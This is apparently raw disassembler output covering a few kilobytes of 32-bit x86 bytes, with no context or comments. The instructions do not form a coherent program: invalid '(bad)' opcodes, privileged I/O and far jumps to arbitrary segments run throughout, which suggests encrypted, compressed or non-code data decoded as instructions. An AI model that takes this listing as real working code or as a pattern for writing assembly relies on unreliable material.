  411072:	stos   BYTE PTR es:[edi],al
  411073:	pop    ebx
  411074:	xchg   BYTE PTR [esi-0x7],bl
  411077:	pushf  
  411078:	neg    DWORD PTR [edx-0x48]
  41107b:	cwde   
  41107c:	outs   dx,DWORD PTR ds:[esi]
  41107d:	xor    DWORD PTR [edi+0x1e45a5e1],esi
  411083:	pop    eax
  411084:	test   al,0x2c
  411086:	and    dh,BYTE PTR [esp+edi*4-0x46]
  41108a:	out    0x8c,eax
  41108c:	dec    esi
  41108d:	out    dx,eax
  41108e:	adc    DWORD PTR [esi],eax
  411090:	xchg   edx,eax
  411091:	pop    ebp
  411092:	xor    eax,0x213c818e
  411097:	xchg   edi,eax
  411098:	jmp    0x350c:0xaf108e20
  41109f:	mov    eax,ds:0x5b76977f
  4110a4:	(bad)  [edi+0x43dff721]
  4110aa:	test   DWORD PTR [edx],esi
  4110ac:	stc    
  4110ad:	push   es
  4110ae:	popf   
  4110af:	jo     0x4110f1
  4110b1:	adc    DWORD PTR [esi-0x67],edi
  4110b4:	sahf   
  4110b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110b6:	das    
  4110b7:	loopne 0x4110e4
  4110b9:	push   ds
  4110ba:	pop    ebp
  4110bb:	sub    edi,DWORD PTR [edx-0x44]
  4110be:	iret   
  4110bf:	(bad)  
  4110c0:	mov    al,0x14
  4110c2:	das    
  4110c3:	mov    ebp,DWORD PTR ds:0x969ff849
  4110c9:	stos   DWORD PTR es:[edi],eax
  4110ca:	xor    DWORD PTR [edi+0x46035443],ebp
  4110d0:	cmp    dl,bh
  4110d2:	pop    ss
  4110d3:	sbb    BYTE PTR [ebx],0xc
  4110d6:	pop    esi
  4110d7:	cwde   
  4110d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110d9:	retf   
  4110da:	cs (bad) 
  4110dd:	dec    eax
  4110de:	add    bh,0x99
  4110e1:	dec    edi
  4110e2:	and    dh,BYTE PTR [edi]
  4110e4:	adc    ecx,DWORD PTR [ecx+0x916477]
  4110ea:	dec    ebx
  4110eb:	push   cs
  4110ec:	loope  0x41107d
  4110ee:	jmp    0x1003aeee
  4110f3:	test   eax,0x9c8bfcc5
  4110f8:	xlat   BYTE PTR ds:[ebx]
  4110f9:	push   esp
  4110fa:	push   eax
  4110fb:	cmp    esp,DWORD PTR [ebx]
  4110fd:	sub    ecx,eax
  4110ff:	adc    dl,al
  411101:	das    
  411102:	pusha  
  411103:	mov    esp,0x5c17380d
  411108:	aad    0x1
  41110a:	fisubr WORD PTR [esi+0x3ef189dc]
  411110:	enter  0xb2e5,0x52
  411114:	pop    eax
  411115:	and    ch,bl
  411117:	sub    BYTE PTR [esi],dh
  411119:	adc    ah,BYTE PTR [ebx+esi*1-0x8f3d073]
  411120:	popf   
  411121:	(bad)  [eax+0x7bb03352]
  411127:	retf   
  411128:	ja     0x4110ec
  41112a:	sbb    BYTE PTR [ebx],bh
  41112c:	pushf  
  41112d:	add    ebp,DWORD PTR [ebx]
  41112f:	and    al,bl
  411131:	cmp    eax,0x3f412bb4
  411136:	iret   
  411137:	sbb    DWORD PTR [ebx+0x62],0x66
  41113b:	(bad)  
  41113c:	icebp  
  41113d:	jmp    0xe665cdf3
  411142:	scas   eax,DWORD PTR es:[edi]
  411143:	adc    eax,0x1718693c
  411148:	push   0xc55430ab
  41114d:	jmp    0xc5c2:0x1638aa03
  411154:	(bad)  
  411155:	jmp    FWORD PTR [ebx+0x6c]
  411158:	test   BYTE PTR cs:[edx+0x6bc4ec76],cl
  41115f:	pop    ds
  411160:	pushf  
  411161:	das    
  411162:	or     eax,0xf62526f6
  411167:	leave  
  411168:	pop    eax
  411169:	push   esp
  41116a:	sub    al,0xac
  41116c:	aad    0x8b
  41116e:	xchg   DWORD PTR [edx],esi
  411170:	test   cl,cl
  411172:	pop    ecx
  411173:	aas    
  411174:	cmp    eax,0x722d4816
  411179:	fdivr  QWORD PTR [eax+0x6512ff40]
  41117f:	mov    cl,BYTE PTR [ebp+edi*4-0x7]
  411183:	sar    BYTE PTR [ecx-0x70b7bc06],1
  411189:	jmp    FWORD PTR cs:[edx-0x4841d930]
  411190:	jge    0x411131
  411192:	sub    cl,BYTE PTR [ebx]
  411194:	jns    0x41113c
  411196:	jb     0x4111f3
  411198:	test   al,0x45
  41119a:	addr16 xchg esp,eax
  41119c:	push   ebx
  41119d:	xchg   BYTE PTR [ecx+edi*8],dh
  4111a0:	jp     0x4111e8
  4111a2:	sbb    BYTE PTR [esi+0x19],cl
  4111a5:	(bad)  
  4111a6:	cmp    edi,DWORD PTR [ebp-0x182fc1a1]
  4111ac:	pusha  
  4111ad:	jo     0x41116e
  4111af:	popa   
  4111b0:	lds    esp,FWORD PTR [edi]
  4111b2:	das    
  4111b3:	mov    dl,0xc
  4111b5:	sbb    DWORD PTR [edi-0x1023dad2],edx
  4111bb:	jl     0x411233
  4111bd:	xor    dh,BYTE PTR [edx]
  4111bf:	ja     0x41120b
  4111c1:	js     0x41123f
  4111c3:	imul   edx,DWORD PTR [esi-0x76],0x2e
  4111c7:	pusha  
  4111c8:	ins    DWORD PTR es:[edi],dx
  4111c9:	cmp    DWORD PTR [esi],0xbb5adc1
  4111cf:	stos   DWORD PTR es:[edi],eax
  4111d0:	cld    
  4111d1:	and    BYTE PTR [bx+si],al
  4111d4:	jnp    0x4111aa
  4111d6:	add    al,0xd1
  4111d8:	cmp    edx,DWORD PTR [esi-0x37cb43f8]
  4111de:	mov    DWORD PTR [esi+0x1366e563],ebp
  4111e4:	outs   dx,DWORD PTR ds:[esi]
  4111e5:	and    eax,0xda628f20
  4111ea:	or     al,0x8e
  4111ec:	rol    eax,0xe5
  4111ef:	inc    esp
  4111f0:	ret    0x3c73
  4111f3:	jo     0x411252
  4111f5:	xchg   esp,eax
  4111f6:	aam    0xc3
  4111f8:	sub    dh,BYTE PTR [edi]
  4111fa:	(bad)  
  4111fb:	xchg   ebp,eax
  4111fc:	call   0x8010:0x946d31d3
  411203:	xchg   esi,eax
  411204:	data16 xor dh,BYTE PTR gs:[ebx+0xcc51bfd]
  41120c:	pushf  
  41120d:	dec    ebp
  41120e:	mov    ecx,ecx
  411210:	push   ecx
  411211:	or     BYTE PTR [ebx+0x39],bh
  411214:	and    eax,0xf26ae016
  411219:	and    ah,dh
  41121b:	lods   eax,DWORD PTR ds:[esi]
  41121c:	lods   al,BYTE PTR ds:[esi]
  41121d:	and    DWORD PTR [esi-0x43],esp
  411220:	daa    
  411221:	xor    DWORD PTR [ebp*2-0x1869906f],esp
  411228:	jmp    0xfcb9:0xb8714f00
  41122f:	lahf   
  411230:	push   ss
  411231:	xor    BYTE PTR [esi],al
  411233:	arpl   di,bx
  411235:	jb     0x4112a2
  411237:	in     al,dx
  411238:	shl    DWORD PTR [edi-0x63],0x14
  41123c:	test   eax,0x678020cc
  411241:	mov    DWORD PTR [ecx-0x651ec407],ebp
  411247:	arpl   dx,ax
  411249:	fisubr WORD PTR [esi+0x56]
  41124c:	and    eax,0x1d32db97
  411251:	jno    0x41121e
  411253:	bound  ebx,QWORD PTR [ebp-0x7f6e26c2]
  411259:	ds mov ebp,0xa5f1a63f
  41125f:	jb     0x411288
  411261:	push   ss
  411262:	sub    eax,0xf86eb510
  411267:	ror    BYTE PTR [ecx-0x66],0xf4
  41126b:	das    
  41126c:	and    edx,esi
  41126e:	jmp    0x342aab34
  411273:	loop   0x411289
  411275:	sub    BYTE PTR [edi-0x2d69c634],cl
  41127b:	shr    bl,0x2
  41127e:	les    ecx,FWORD PTR [ecx-0x29]
  411281:	stos   BYTE PTR es:[edi],al
  411282:	lahf   
  411283:	test   DWORD PTR [edx+0x1e],edx
  411286:	cli    
  411287:	mov    BYTE PTR [edx+0x70f345b4],al
  41128d:	sbb    DWORD PTR [edx+edi*8+0x34],esp
  411291:	add    eax,0x7f906d34
  411296:	sbb    eax,0x52ae7be2
  41129b:	loope  0x411243
  41129d:	push   ebx
  41129e:	push   cs
  41129f:	mov    dh,0x9
  4112a1:	mov    BYTE PTR [ebp+0x15],al
  4112a4:	call   0xc3fe8624
  4112a9:	dec    ecx
  4112aa:	ficom  DWORD PTR [ebx-0x32]
  4112ad:	int    0x31
  4112af:	out    dx,eax
  4112b0:	popf   
  4112b1:	jno    0x4112ec
  4112b3:	mov    dl,0x85
  4112b5:	xchg   esi,eax
  4112b6:	imul   edx,DWORD PTR ds:[edx-0x5b],0x45ecc95e
  4112be:	mov    WORD PTR [esp+ebp*4+0x48],?
  4112c2:	fwait
  4112c3:	xor    bl,BYTE PTR [edi-0x5856a59e]
  4112c9:	retf   0xe50e
  4112cc:	pop    ds
  4112cd:	lods   al,BYTE PTR ds:[esi]
  4112ce:	cmp    DWORD PTR [ebx],0xfffffff4
  4112d1:	aam    0xff
  4112d3:	sti    
  4112d4:	cmp    ebx,ebp
  4112d6:	hlt    
  4112d7:	jmp    0x96b7734c
  4112dc:	inc    esi
  4112dd:	retf   
  4112de:	add    ebp,edi
  4112e0:	ja     0x41132b
  4112e2:	push   esi
  4112e3:	mov    esp,0x2cbc61fe
  4112e8:	adc    BYTE PTR [edi-0x5717578e],0xaf
  4112ef:	xchg   edx,eax
  4112f0:	cmc    
  4112f1:	mov    bh,0x16
  4112f3:	je     0x41128f
  4112f5:	loop   0x411323
  4112f7:	dec    edx
  4112f8:	jnp    0x4112b4
  4112fa:	mov    ebx,0xe00c6ad4
  4112ff:	sub    al,0x76
  411301:	cmp    ah,bh
  411303:	mov    cl,0x60
  411305:	mov    esp,0xa0b52633
  41130a:	int    0xb7
  41130c:	out    0x81,al
  41130e:	mov    bl,0xd2
  411310:	sbb    eax,0xb34fbf61
  411315:	ja     0x4112dd
  411317:	push   esi
  411318:	push   ds
  411319:	inc    ecx
  41131a:	xchg   esp,eax
  41131b:	fwait
  41131c:	in     al,0x51
  41131e:	sub    BYTE PTR [edx],0x7f
  411321:	pop    esi
  411322:	mov    WORD PTR gs:[ecx+ecx*8-0x489c204c],ss
  41132a:	add    eax,0x4aae91bc
  41132f:	out    dx,al
  411330:	outs   dx,BYTE PTR ds:[esi]
  411331:	int3   
  411332:	leave  
  411333:	iret   
  411334:	jnp    0x411362
  411336:	into   
  411337:	dec    edi
  411338:	lahf   
  411339:	jge    0x4113ba
  41133b:	push   ecx
  41133c:	outs   dx,BYTE PTR ds:[esi]
  41133d:	js     0x4112c2
  41133f:	or     DWORD PTR [bp+di],esp
  411342:	xchg   edi,eax
  411343:	dec    ecx
  411344:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411345:	jg     0x41134a
  411347:	push   0x35a17f43
  41134c:	stc    
  41134d:	int3   
  41134e:	ins    DWORD PTR es:[edi],dx
  41134f:	jle    0x41131b
  411351:	jmp    0x2683dc4d
  411356:	mov    dh,0x79
  411358:	repz bound ebx,QWORD PTR [esi+0x18ed0127]
  41135f:	pop    es
  411360:	adc    eax,0xc44fefb9
  411365:	pop    edx
  411366:	sub    al,0x40
  411368:	nop
  411369:	arpl   WORD PTR [eax-0x41],ax
  41136c:	push   cs
  41136d:	js     0x4113ea
  41136f:	sbb    bl,dh
  411371:	jne    0x41130b
  411373:	xor    eax,0xbc47f211
  411378:	xor    BYTE PTR [edx],bl
  41137a:	cwde   
  41137b:	test   ebx,edx
  41137d:	cmc    
  41137e:	xor    bl,BYTE PTR [edi-0x35]
  411381:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411382:	dec    esp
  411383:	sbb    eax,0x1c7a5f95
  411388:	ret    
  411389:	sbb    dl,BYTE PTR [ecx+edi*2+0x50]
  41138d:	fistp  QWORD PTR [esi+edi*2-0x16096ef]
  411394:	shl    DWORD PTR [eax-0x23966c22],0x96
  41139b:	ror    DWORD PTR [eax-0x7a],1
  41139e:	rol    BYTE PTR [ecx+0x6b],1
  4113a1:	pop    ecx
  4113a2:	cwde   
  4113a3:	adc    BYTE PTR [esi+0x5f],bl
  4113a6:	and    eax,0x445e8bd7
  4113ab:	scas   al,BYTE PTR es:[edi]
  4113ac:	jns    0x411354
  4113ae:	pop    ss
  4113af:	and    al,al
  4113b1:	xor    DWORD PTR [ecx+ecx*2-0x1],ecx
  4113b5:	sbb    DWORD PTR [edi+0x39b2f73c],ebx
  4113bb:	adc    dh,cl
  4113bd:	fnstcw WORD PTR [eax+0xd41612c]
  4113c3:	mov    bh,0xbb
  4113c5:	shl    esp,0x10
  4113c8:	sbb    dh,0x4a
  4113cb:	add    DWORD PTR ds:0xd1939ed,esp
  4113d1:	mov    ch,0x34
  4113d3:	xchg   ecx,eax
  4113d4:	inc    esi
  4113d5:	and    DWORD PTR [edi-0xcc31e6b],0xffffffa8
  4113dc:	(bad)  
  4113dd:	(bad)  
  4113de:	push   ss
  4113df:	mov    edx,0xe658c80a
  4113e4:	fmul   DWORD PTR ds:0xa9c6314
  4113ea:	mov    ds:0x1a77aa38,al
  4113ef:	add    ch,BYTE PTR [edx-0x1da84f9e]
  4113f5:	cld    
  4113f6:	mov    esi,DWORD PTR [ecx]
  4113f8:	out    0x38,eax
  4113fa:	hlt    
  4113fb:	aad    0x34
  4113fd:	popa   
  4113fe:	xor    eax,0x1b16b333
  411403:	gs inc edx
  411405:	fbld   TBYTE PTR [esi+0x48]
  411408:	push   edi
  411409:	xchg   edi,eax
  41140a:	jae    0x41139b
  41140c:	rcr    BYTE PTR [ebx-0x13],1
  41140f:	pop    esp
  411410:	jnp    0x411429
  411412:	push   edi
  411413:	outs   dx,BYTE PTR ds:[esi]
  411414:	mov    DWORD PTR [ecx+0x46bc4844],edi
  41141a:	lahf   
  41141b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41141c:	test   BYTE PTR [esi+ebp*8],dh
  41141f:	mov    bh,0x1d
  411421:	cmp    BYTE PTR [esi+0x2f],dl
  411424:	ds jmp 0xce76096
  41142a:	cmp    bh,0xe8
  41142d:	push   ds
  41142e:	push   edx
  41142f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411430:	add    ecx,DWORD PTR [ecx-0x49c5394a]
  411436:	in     eax,0xb5
  411438:	vsubss xmm6,xmm1,DWORD PTR [esi+0x71]
  41143d:	jmp    0xe2f57dd9
  411442:	aam    0xdf
  411444:	mov    eax,0x4b834026
  411449:	les    eax,FWORD PTR [ebp+0x0]
  41144c:	or     al,0xb9
  41144e:	or     eax,0x344aec88
  411453:	into   
  411454:	push   cs
  411455:	or     eax,0xfe40a056
  41145a:	nop
  41145b:	dec    ebx
  41145c:	dec    esi
  41145d:	jmp    0x6708:0x8dbacaec
  411464:	repnz dec esp
  411466:	xchg   BYTE PTR [esi-0x3afb397b],dh
  41146c:	and    ch,0xf8
  41146f:	add    al,0x62
  411471:	adc    BYTE PTR [edi-0x5c6bc9cb],bh
  411477:	sbb    eax,0xc0af4518
  41147c:	clc    
  41147d:	test   al,0xf9
  41147f:	mov    eax,0x586db37e
  411484:	stc    
  411485:	and    ecx,ecx
  411487:	fild   DWORD PTR [edi+0x16c44031]
  41148d:	fwait
  41148e:	jno    0x411499
  411490:	ins    DWORD PTR es:[edi],dx
  411491:	push   eax
  411492:	lds    ebp,FWORD PTR [ecx]
  411494:	jecxz  0x4114d7
  411496:	jmp    0x23cb:0xc27cc5b7
  41149d:	bound  eax,QWORD PTR [esi]
  41149f:	sbb    BYTE PTR [eax+0x46],0x99
  4114a3:	adc    eax,0xfaf655e6
  4114a8:	dec    eax
  4114a9:	bound  esi,QWORD PTR [eax+0x4a8cb601]
  4114af:	mov    al,0x6c
  4114b1:	push   ecx
  4114b2:	cmp    DWORD PTR [edx+0x6a],esi
  4114b5:	sbb    BYTE PTR [edi+eax*4-0x54d613b9],dl
  4114bc:	ret    
  4114bd:	mov    esp,0x4301ea13
  4114c2:	sub    BYTE PTR [esp+ebp*8],bh
  4114c5:	push   0x32
  4114c7:	xor    cl,BYTE PTR ss:[esi+eiz*2+0x63]
  4114cc:	in     al,0xc
  4114ce:	(bad)  
  4114cf:	push   ebx
  4114d0:	add    ebx,DWORD PTR [ebx-0x6e]
  4114d3:	icebp  
  4114d4:	inc    ebp
  4114d5:	sbb    eax,0x8a3e01c6
  4114da:	ins    BYTE PTR es:[edi],dx
  4114db:	js     0x41150b
  4114dd:	sbb    al,0xcb
  4114df:	(bad)  
  4114e1:	sub    BYTE PTR [esi],bh
  4114e3:	xor    al,0x1c
  4114e5:	xor    eax,0xc597a61c
  4114ea:	pop    ebp
  4114eb:	push   edx
  4114ec:	gs jno 0x4114e8
  4114ef:	xchg   edi,eax
  4114f0:	stos   DWORD PTR es:[edi],eax
  4114f1:	mov    bh,0xa1
  4114f3:	aad    0x25
  4114f5:	mov    ds:0x79a51078,al
  4114fa:	hlt    
  4114fb:	adc    BYTE PTR ds:0xf58f5637,ch
  411501:	jl     0x41156c
  411503:	dec    eax
  411504:	imul   edi,DWORD PTR [eax+0x44],0xffffffca
  411508:	sub    ebx,DWORD PTR [eax+0x1b815569]
  41150e:	adc    dh,BYTE PTR [eax]
  411510:	pusha  
  411511:	mov    eax,0x963ae086
  411516:	jge    0x411587
  411518:	dec    ecx
  411519:	loop   0x411535
  41151b:	and    al,0x1b
  41151d:	daa    
  41151e:	test   BYTE PTR [esi+0x5e],bl
  411521:	int    0x98
  411523:	sbb    DWORD PTR [ecx+0x7e4e38fc],edi
  411529:	sub    BYTE PTR [edx+0x2763e304],dh
  41152f:	pop    ss
  411530:	mov    ebx,DWORD PTR fs:[esi+ebp*8-0x2a]
  411535:	jb     0x411582
  411537:	xchg   edx,eax
  411538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411539:	xor    DWORD PTR [ecx+0x635ba4ff],0x61e11433
  411543:	sti    
  411544:	in     al,0xc9
  411546:	xor    al,ch
  411548:	xlat   BYTE PTR ds:[ebx]
  411549:	inc    ebp
  41154a:	clc    
  41154b:	ror    DWORD PTR [edi+0x7570fc6d],1
  411551:	push   es
  411552:	rol    esp,cl
  411554:	int3   
  411555:	add    DWORD PTR [edx],ebx
  411557:	jae    0x411549
  411559:	std    
  41155a:	out    0xb1,eax
  41155c:	mov    bh,0x33
  41155e:	std    
  41155f:	gs test eax,0x9dcfbc69
  411565:	out    dx,al
  411566:	jne    0x4114f6
  411568:	inc    eax
  411569:	mov    DWORD PTR [ebx+0x4d],eax
  41156c:	out    0x3f,eax
  41156e:	jmp    0x4115ab
  411570:	ficomp DWORD PTR [ecx-0x7e55a6ad]
  411576:	ret    
  411577:	mov    dl,0x39
  411579:	daa    
  41157a:	enter  0x5e88,0x73
  41157e:	adc    dh,BYTE PTR [ecx]
  411580:	sub    DWORD PTR [ebp-0x16193366],edx
  411586:	pop    ds
  411587:	mov    esp,ecx
  411589:	sbb    BYTE PTR [ecx+0x1dfa6cfc],0x63
  411590:	mov    bl,0xd
  411592:	jp     0x41158a
  411594:	jb     0x411595
  411596:	ja     0x411613
  411598:	stc    
  411599:	and    DWORD PTR ds:[eax],esi
  41159c:	jno    0x411556
  41159e:	sbb    al,0x51
  4115a0:	mov    esi,0xea41c77b
  4115a5:	xor    al,0xf1
  4115a7:	(bad)  
  4115a8:	dec    ebp
  4115a9:	mov    eax,0x6618cb59
  4115ae:	test   bh,bl
  4115b0:	popa   
  4115b1:	push   es
  4115b2:	stos   DWORD PTR es:[edi],eax
  4115b3:	sbb    edx,DWORD PTR [esi]
  4115b5:	out    0x79,al
  4115b7:	jb     0x41158f
  4115b9:	xchg   ecx,eax
  4115ba:	mov    dh,0x4e
  4115bc:	call   0xeb0a:0x2a360188
  4115c3:	retf   
  4115c4:	repnz xor eax,DWORD PTR [edx-0x6420c5de]
  4115cb:	or     edx,DWORD PTR [edi]
  4115cd:	in     eax,dx
  4115ce:	test   DWORD PTR [eax-0x7471be1e],ebp
  4115d4:	not    BYTE PTR [edi-0x3]
  4115d7:	mov    al,0xd1
  4115d9:	pop    ecx
  4115da:	add    eax,0x94cc1042
  4115df:	dec    eax
  4115e0:	cmp    dl,bl
  4115e2:	stc    
  4115e3:	loop   0x411566
  4115e5:	gs bnd jae 0x4115dc
  4115e9:	jge    0x41156b
  4115eb:	sub    ebx,DWORD PTR [ebp-0x3d]
  4115ee:	imul   esp
  4115f0:	mov    eax,ds:0x90caf4dc
  4115f5:	pop    esp
  4115f6:	scas   al,BYTE PTR es:[edi]
  4115f7:	and    ecx,DWORD PTR [edx]
  4115f9:	dec    esi
  4115fa:	sbb    ebx,0x79
  4115fd:	push   edx
  4115fe:	stc    
  4115ff:	fmul   st(7),st
  411601:	add    DWORD PTR [ebx-0x5],esi
  411604:	bound  esi,QWORD PTR [ecx-0x9]
  411607:	repz (bad) 
  411609:	sub    ecx,DWORD PTR [ecx-0x22e5a5b2]
  41160f:	rol    DWORD PTR ds:0x9bff2470,0xe7
  411616:	inc    edx
  411617:	fstp   DWORD PTR [eax+0x9fb7b99]
  41161d:	sub    DWORD PTR [edx+0x3f],esi
  411620:	cld    
  411621:	push   es
  411622:	adc    BYTE PTR [ecx-0x32],ch
  411625:	scas   eax,DWORD PTR es:[edi]
  411626:	jns    0x41166e
  411628:	in     al,dx
  411629:	xor    DWORD PTR [edi-0x79],0x8ba4ca87
  411630:	je     0x411686
  411632:	loop   0x4115f0
  411634:	cdq    
  411635:	cdq    
  411636:	push   es
  411637:	mov    ah,0xda
  411639:	sbb    DWORD PTR [edx],0x6e472d6c
  41163f:	test   BYTE PTR [esi+0x21],bl
  411642:	retf   
  411643:	hlt    
  411644:	mov    ebx,0x19263104
  411649:	pop    eax
  41164a:	or     eax,0x976f4699
  41164f:	or     DWORD PTR [edx+0x23180f96],esi
  411655:	mov    esp,0xc2983781
  41165a:	cmp    DWORD PTR [ecx],ebx
  41165c:	xor    eax,DWORD PTR ds:0xa9fd5b4d
  411662:	pop    ebp
  411663:	repnz cmp DWORD PTR [edx],esp
  411666:	mov    BYTE PTR [ecx],0x72
  411669:	ret    
  41166a:	icebp  
  41166b:	sbb    esi,esi
  41166d:	stc    
  41166e:	adc    edx,0x4f
  411671:	fimul  WORD PTR [bx]
  411674:	inc    edi
  411675:	jg     0x41162d
  411677:	test   DWORD PTR [eax],ecx
  411679:	adc    ch,al
  41167b:	(bad)  
  41167d:	adc    eax,0x9b2c8823
  411682:	in     al,dx
  411683:	pop    eax
  411684:	xchg   esi,eax
  411685:	mov    ch,0xa2
  411687:	fdiv   st(0),st
  411689:	enter  0x9375,0x8f
  41168d:	mov    cl,bl
  41168f:	retf   
  411690:	rol    BYTE PTR ds:0x56e4900d,1
  411696:	fwait
  411697:	push   edx
  411698:	inc    ecx
  411699:	icebp  
  41169a:	push   0x323fb990
  41169f:	xchg   BYTE PTR [edx+ecx*8],ah
  4116a2:	adc    eax,0x6f67f51c
  4116a7:	dec    ebp
  4116a8:	or     BYTE PTR [esi-0x69a9104d],dh
  4116ae:	and    eax,0xbdcaf8c2
  4116b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116b4:	ja     0x4116e7
  4116b6:	sbb    ebx,DWORD PTR [ebp+ecx*8-0x18c87b70]
  4116bd:	rcl    DWORD PTR [edi+0x13],cl
  4116c0:	jbe    0x4116ff
  4116c2:	mov    dl,0xed
  4116c4:	jl     0x411669
  4116c6:	xchg   esp,eax
  4116c7:	push   esp
  4116c8:	lahf   
  4116c9:	mov    edi,0xf224eeb7
  4116ce:	push   ecx
  4116cf:	push   ebx
  4116d0:	call   0x6f7a:0x29a9784c
  4116d7:	(bad)  
  4116d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116da:	lea    eax,[edx]
  4116dc:	les    eax,FWORD PTR [ebx+0x5bfe0614]
  4116e2:	int    0x7
  4116e4:	gs mov edx,0xd525767a
  4116ea:	lock imul BYTE PTR cs:[ecx-0x1e9154e8]
  4116f2:	mov    ecx,0x1ae4e090
  4116f7:	outs   dx,DWORD PTR ds:[esi]
  4116f8:	mov    edx,tr5
  4116fb:	into   
  4116fc:	dec    eax
  4116fd:	iret   
  4116fe:	mov    eax,0x27e1e57a
  411703:	lods   eax,DWORD PTR ds:[esi]
  411704:	in     eax,dx
  411705:	jns    0x4116bb
  411707:	ins    DWORD PTR es:[edi],dx
  411708:	xchg   ecx,eax
  411709:	jno    0x41169c
  41170b:	lods   eax,DWORD PTR ds:[esi]
  41170c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41170d:	xor    DWORD PTR [eax+0x76471f6c],eax
  411713:	add    DWORD PTR [edx],edx
  411715:	pop    edi
  411716:	push   edx
  411717:	mov    BYTE PTR [ebx-0x7c],bh
  41171a:	pop    ss
  41171b:	rol    DWORD PTR [ecx+0x56b2d688],1
  411721:	pop    ds
  411722:	sub    al,dl
  411724:	add    esi,DWORD PTR [eax+edx*2-0x1811dae1]
  41172b:	outs   dx,DWORD PTR ds:[esi]
  41172c:	dec    edi
  41172d:	enter  0xbc6a,0x61
  411731:	push   ebx
  411732:	mov    ch,0xb8
  411734:	add    al,0x6a
  411736:	mov    ebx,0xfc25132e
  41173b:	and    DWORD PTR [ecx],eax
  41173d:	je     0x41171f
  41173f:	lea    eax,[edi]
  411741:	pop    esi
  411742:	mov    es,esp
  411744:	mov    edi,0x11910dfd
  411749:	or     BYTE PTR [edi],ch
  41174b:	sub    al,BYTE PTR [edx]
  41174d:	sbb    BYTE PTR [esi+0x38],dh
  411750:	aaa    
  411751:	xor    BYTE PTR [ebx-0x61],0x37
  411755:	cmp    BYTE PTR [edi+0x27],al
  411758:	add    BYTE PTR [ecx+0x37],bh
  41175b:	xchg   edx,eax
  41175c:	mov    ah,0xb5
  41175e:	xor    eax,0x4a1bbc40
  411763:	sub    dh,BYTE PTR [esi+0x3c]
  411766:	or     BYTE PTR [ecx-0x45],ch
  411769:	push   es
  41176a:	xor    eax,DWORD PTR [ebx+0x77cac334]
  411770:	fwait
  411771:	pusha  
  411772:	dec    edx
  411773:	lods   al,BYTE PTR ds:[esi]
  411774:	ret    
  411775:	cvtpi2ps xmm2,QWORD PTR [esi]
  411778:	sbb    bh,BYTE PTR [eax]
  41177a:	out    dx,al
  41177b:	cmp    ch,BYTE PTR [ebx]
  41177d:	aas    
  41177e:	mov    bh,0xe0
  411780:	xor    dh,BYTE PTR [edi+0x46]
  411783:	jbe    0x411713
  411785:	repnz push ebx
  411787:	addr16 cmp eax,0x8d6385ca
  41178d:	sbb    al,0x49
  41178f:	(bad)  
  411790:	nop
  411791:	stc    
  411792:	mov    edi,0xb3e65df2
  411797:	sub    BYTE PTR [ecx],bl
  411799:	mov    ds:0xc393e0ff,eax
  41179e:	pop    ecx
  41179f:	shr    DWORD PTR [edx+0x7ee4d6d2],1
  4117a5:	adc    cl,BYTE PTR [ecx]
  4117a7:	ficomp WORD PTR [edx+0x48]
  4117aa:	push   ecx
  4117ab:	mov    dh,0x16
  4117ad:	mov    eax,ds:0xd9f9a0d8
  4117b2:	add    DWORD PTR [ecx-0x6],ecx
  4117b5:	loop   0x41176a
  4117b7:	jg     0x41178b
  4117b9:	cmp    dh,BYTE PTR [ebp+0x70fe0266]
  4117bf:	xchg   edx,eax
  4117c0:	pavgb  mm7,QWORD PTR [ebp+0x68]
  4117c4:	outs   dx,BYTE PTR ds:[esi]
  4117c5:	outs   dx,DWORD PTR ds:[esi]
  4117c6:	test   BYTE PTR [edi-0x24f395ed],ch
  4117cc:	aad    0xf0
  4117ce:	pop    ebp
  4117cf:	and    BYTE PTR [ebp+ecx*1+0x7],al
  4117d3:	xchg   BYTE PTR [edi+0x8144649],cl
  4117d9:	push   edx
  4117da:	adc    DWORD PTR ds:0xd3fb92ac,edx
  4117e0:	dec    esp
  4117e1:	jb     0x4117b4
  4117e3:	cli    
  4117e4:	mov    ch,0x3a
  4117e6:	sub    al,0x5
  4117e8:	push   0x4d
  4117ea:	mov    esp,0x6e605a68
  4117ef:	imul   ecx,DWORD PTR [ebx],0x61566766
  4117f5:	stc    
  4117f6:	jmp    0x832d:0xc2d50af4
  4117fd:	(bad)
  411800:	int    0xd1
  411802:	pop    ds
  411803:	ja     0x4117c5
  411805:	loopne 0x4117d4
  411807:	in     eax,0x4
  411809:	into   
  41180a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41180b:	sub    DWORD PTR [ebp+esi*2+0x7db28252],edx
  411812:	popf   
  411813:	clc    
  411814:	punpckldq mm5,DWORD PTR [esi]
  411817:	ins    BYTE PTR es:[edi],dx
  411818:	inc    ebp
  411819:	pop    es
  41181a:	fistp  DWORD PTR ds:0x16f5eb6a
  411820:	pop    ebp
  411821:	sub    al,0x12
  411823:	js     0x4117c3
  411825:	mov    edi,0x72e28929
  41182a:	fidivr DWORD PTR [edi+0x1f]
  41182d:	sti    
  41182e:	cmc    
  41182f:	xchg   BYTE PTR [esi],ah
  411831:	pop    ebp
  411832:	adc    eax,ebx
  411834:	jmp    0x4118b0
  411836:	ror    DWORD PTR [edi-0x479ed9ba],0x3b
  41183d:	dec    edi
  41183e:	mov    eax,0x50cf6bef
  411843:	mov    al,0x9b
  411845:	je     0x41188c
  411847:	xchg   esp,eax
  411848:	inc    edx
  411849:	inc    ebx
  41184a:	cmp    edx,0xb814a362
  411850:	jmp    0x41184e
  411852:	xor    BYTE PTR [eax+0x1a],0xb3
  411856:	pop    ds
  411857:	in     eax,0x7f
  411859:	ret    
  41185a:	lds    edi,FWORD PTR [ebx+ebp*2+0x296d7959]
  411861:	ficomp WORD PTR [ebx]
  411863:	xchg   esi,eax
  411864:	mov    edi,0xd2152d8
  411869:	xor    dh,dl
  41186b:	sti    
  41186c:	fist   WORD PTR [eax]
  41186e:	push   ss
  41186f:	and    BYTE PTR [edx-0x48fbed8e],0x85
  411876:	add    dl,ch
  411878:	retf   
